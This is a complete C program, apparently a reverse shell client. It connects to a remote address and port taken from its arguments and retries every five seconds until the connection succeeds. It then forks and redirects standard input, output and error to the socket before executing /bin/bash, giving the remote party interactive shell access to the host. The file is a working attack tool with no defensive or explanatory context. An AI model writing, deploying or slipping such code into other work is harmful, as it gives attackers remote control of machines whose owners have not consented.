#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

const int MAXSIZE = 65536;
const int PATH_MAX = 128000;

int main(int argc, char** argv){
	if(argc < 3){
		printf("Usage: ./client remote_address remote_port");
		exit(EXIT_FAILURE);
	}
	short int portno;
	portno = atoi(argv[2]);

	int client_sock = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr(argv[1]);
	server_addr.sin_port = htons(portno);

	int connectie = connect(client_sock, (struct sockaddr *) &server_addr, sizeof(server_addr));
	while(connectie < 0){
		sleep(5);
		connectie = connect(client_sock, (struct sockaddr *) &server_addr, sizeof(server_addr));
	}
	int pid = fork();
	if(pid > 0){
		printf("In parent process. Waiting\n");
		wait(NULL);
	}
	else{
		printf("In child process. Nice\n");
		dup2(client_sock, 0);
		dup2(client_sock, 1);
		dup2(client_sock, 2);
		execl("/bin/bash", "/bin/bash", NULL);
	}
	return 0;
}
